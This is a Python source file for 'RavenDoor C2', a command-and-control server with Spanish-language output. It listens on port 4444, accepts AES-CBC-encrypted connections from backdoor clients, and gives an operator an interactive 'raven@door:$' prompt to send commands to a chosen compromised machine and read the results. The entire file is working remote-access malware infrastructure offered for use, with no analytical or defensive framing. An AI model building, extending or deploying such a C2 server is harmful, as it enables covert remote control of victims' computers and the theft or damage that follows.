import socket
import threading
import select
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import sys
import os
import time

class RavenServer:
    def __init__(self, host='0.0.0.0', port=4444, key_hex=None):
        self.host = host
        self.port = port
        
        if key_hex:
            if len(key_hex) != 64:
                print(f"[ERROR]: La clave debe tener 64 caracteres hexadecimales")
                print(f"[-] Longitud actual: {len(key_hex)} caracteres")
                sys.exit(1)
                
            self.key = bytes.fromhex(key_hex)
            print(f"[+] Clave CBC cargada: {key_hex[:20]}...{key_hex[-20:]}")
        else:
            print("[!] Debes proporcionar una clave con --key")
            print("[!] Ejemplo: python3 raven_client.py --key a1b2c3...")
            sys.exit(1)
            
        self.clients = {}
        self.client_counter = 1
        self.selected_client = None
        
    def start(self):
        print(f"\n{'='*70}")
        print(f"[+] \033[1;31mRavenDoor C2\033[0m - \033[1;37mServidor CBC Encriptado\033[0m")
        print(f"{'='*70}\n")
        print("[+] Esperando conexiones de RavenDoor...")
        print("[+] Comandos en el servidor:")
        print("    list          - Listar clientes conectados")
        print("    select <id>   - Seleccionar cliente")
        print("    back          - Volver al menú principal")
        print("    exit          - Salir\n")
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        server.setblocking(False)
        
        inputs = [server, sys.stdin]
        
        try:
            while True:
                readable, _, _ = select.select(inputs, [], [])
                
                for s in readable:
                    if s is server:
                        client_socket, addr = server.accept()
                        client_socket.setblocking(True)
                        
                        # Manejar cliente en hilo separado
                        thread = threading.Thread(
                            target=self.handle_client,
                            args=(client_socket, addr)
                        )
                        thread.daemon = True
                        thread.start()
                        
                    elif s is sys.stdin:
                        if self.selected_client:
                            continue  # Los comandos van al cliente seleccionado
                        cmd = sys.stdin.readline().strip()
                        self.handle_server_command(cmd)
                        
        except KeyboardInterrupt:
            print("\n[+] Servidor detenido")
        finally:
            server.close()
    
    def create_cipher_for_client(self, iv):
        return AES.new(self.key, AES.MODE_CBC, iv=iv)
    
    def handle_client(self, client_socket, addr):
        client_id = self.client_counter
        self.client_counter += 1
        
        try:
            # Recibir handshake
            client_socket.settimeout(10)
            handshake_data = client_socket.recv(1024)
            
            if not handshake_data:
                print(f"[-] Conexión cerrada por {addr}")
                client_socket.close()
                return
                
            handshake = handshake_data.decode('utf-8', errors='ignore')
            
            if handshake.startswith("RAVENDOOR_CBC:"):
                parts = handshake.split(":")
                if len(parts) < 2:
                    print(f"[-] Formato de handshake CBC inválido de {addr}")
                    client_socket.close()
                    return
                    
                iv_hex = parts[1].strip()
                
                if len(iv_hex) != 32:  # 16 bytes en hex = 32 caracteres
                    print(f"[-] IV inválido de {addr}: longitud {len(iv_hex)}, esperaba 32")
                    client_socket.close()
                    return
                    
                try:
                    iv = bytes.fromhex(iv_hex)
                except ValueError as e:
                    print(f"[-] Error convirtiendo IV de {addr}: {e}")
                    client_socket.close()
                    return
                
                # Enviar ACK
                client_socket.send(b"ACK")
                
                # Guardar cliente (el cipher se crea dinámicamente)
                self.clients[client_id] = {
                    'socket': client_socket,
                    'addr': addr,
                    'iv': iv,
                    'connected': True
                }
                
                print(f"\n[+] Cliente #{client_id} conectado desde {addr}")
                print(f"[+] IV: {iv_hex}")
                
                # Recibir banner inicial
                banner = self.receive_from_client(client_id)
                if banner:
                    print(f"\n{banner}")
                else:
                    print(f"[-] No se recibió banner del cliente #{client_id}")
                
                print(f"\n[Cliente #{client_id}] Listo para comandos")
                print("Escribe 'select {client_id}' para interactuar")
                
            else:
                print(f"[-] Handshake CBC inválido de {addr}")
                client_socket.close()
                
        except socket.timeout:
            print(f"[-] Timeout en handshake de {addr}")
            client_socket.close()
        except Exception as e:
            print(f"[-] Error con cliente {addr}: {e}")
            try:
                client_socket.close()
            except:
                pass
            if client_id in self.clients:
                del self.clients[client_id]
    
    def handle_server_command(self, cmd):
        if cmd == "list":
            self.list_clients()
        elif cmd.startswith("select "):
            try:
                client_id = int(cmd.split()[1])
                if client_id in self.clients:
                    self.select_client(client_id)
                else:
                    print(f"[-] Cliente #{client_id} no existe")
            except:
                print("[-] ID inválido. Uso: select <número>")
        elif cmd == "exit":
            print("[+] Cerrando servidor...")
            os._exit(0)
        elif cmd:
            print("[!] Comando no reconocido")
    
    def select_client(self, client_id):
        self.selected_client = client_id
        client = self.clients[client_id]
        
        print(f"\n[+] Seleccionado Cliente #{client_id}")
        print("[+] Escribe comandos para enviar (escribe 'back' para volver)")
        
        try:
            while True:
                try:
                    cmd = input(f"\033[91mraven@door:$ \033[0m").strip()
                    
                    if cmd.lower() == 'back':
                        print("[+] Volviendo al menú principal")
                        self.selected_client = None
                        break
                        
                    if not cmd:
                        continue
                    
                    # Enviar comando
                    success = self.send_to_client(client_id, cmd)
                    if not success:
                        break
                    
                    # Recibir respuesta
                    response = self.receive_from_client(client_id)
                    if response:
                        # Mostrar respuesta limpiamente
                        self.display_response(response)
                        
                except EOFError:
                    print("\n[+] Volviendo al menú principal")
                    self.selected_client = None
                    break
                    
        except KeyboardInterrupt:
            print("\n[+] Volviendo al menú principal")
            self.selected_client = None
        except Exception as e:
            print(f"[-] Error: {e}")
            self.selected_client = None
    
    def display_response(self, response):
        lines = response.split('\n')
        for line in lines:
            if line.strip() and not line.strip().startswith('raven@door:$'):
                print(line)
    
    def send_to_client(self, client_id, data):
        try:
            client = self.clients[client_id]
            iv = client['iv']
            
            cipher = AES.new(self.key, AES.MODE_CBC, iv=iv)
            
            # Encriptar datos con padding
            padded_data = pad(data.encode(), AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            
            # Enviar longitud (4 bytes big-endian)
            len_bytes = len(encrypted).to_bytes(4, 'big')
            client['socket'].send(len_bytes)
            
            # Enviar datos encriptados
            client['socket'].send(encrypted)
            return True
            
        except Exception as e:
            print(f"[-] Error enviando a cliente #{client_id}: {e}")
            self.remove_client(client_id)
            return False
    
    def receive_from_client(self, client_id):
        try:
            client = self.clients[client_id]
            socket = client['socket']
            iv = client['iv']
            
            cipher = AES.new(self.key, AES.MODE_CBC, iv=iv)
            
            # Recibir longitud (4 bytes)
            len_bytes = socket.recv(4)
            if not len_bytes or len(len_bytes) != 4:
                print(f"[-] Cliente #{client_id} desconectado (sin longitud)")
                self.remove_client(client_id)
                return None
                
            msg_len = int.from_bytes(len_bytes, 'big')
            
            if msg_len <= 0 or msg_len > 10 * 1024 * 1024:  # Límite 10MB
                print(f"[-] Longitud de mensaje inválida: {msg_len}")
                self.remove_client(client_id)
                return None
                
            # Recibir datos encriptados
            encrypted = b''
            while len(encrypted) < msg_len:
                chunk = socket.recv(min(4096, msg_len - len(encrypted)))
                if not chunk:
                    print(f"[-] Cliente #{client_id} desconectado durante recepción")
                    self.remove_client(client_id)
                    return None
                encrypted += chunk
            
            # Desencriptar y quitar padding
            try:
                decrypted_padded = cipher.decrypt(encrypted)
                decrypted = unpad(decrypted_padded, AES.block_size)
                result = decrypted.decode('utf-8', errors='ignore')
                return result
            except Exception as e:
                print(f"[-] Error desencriptando de cliente #{client_id}: {e}")
                self.remove_client(client_id)
                return None
                
        except Exception as e:
            print(f"[-] Error recibiendo de cliente #{client_id}: {e}")
            self.remove_client(client_id)
            return None
    
    def list_clients(self):
        if not self.clients:
            print("[+] No hay clientes conectados")
            return
            
        print("\n[+] Clientes conectados:")
        for client_id, client in self.clients.items():
            status = "CONECTADO" if client['connected'] else "DESCONECTADO"
            print(f"    [{client_id}] {client['addr'][0]}:{client['addr'][1]} - {status}")
    
    def remove_client(self, client_id):
        if client_id in self.clients:
            print(f"[-] Cliente #{client_id} desconectado")
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            del self.clients[client_id]
            
            if self.selected_client == client_id:
                self.selected_client = None
                print("[+] Volviendo al menú principal")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='RavenDoor C2 Server - CBC Mode')
    parser.add_argument('--host', default='0.0.0.0', help='IP para escuchar')
    parser.add_argument('--port', type=int, default=4444, help='Puerto')
    parser.add_argument('--key', required=True, help='Clave AES-256 en hex (64 chars)')
    
    args = parser.parse_args()
    
    # Verificar dependencias
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
    except ImportError:
        print("[!] Instalando pycryptodome...")
        os.system("pip3 install pycryptodome > /dev/null 2>&1")
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
    
    server = RavenServer(args.host, args.port, args.key)
    server.start()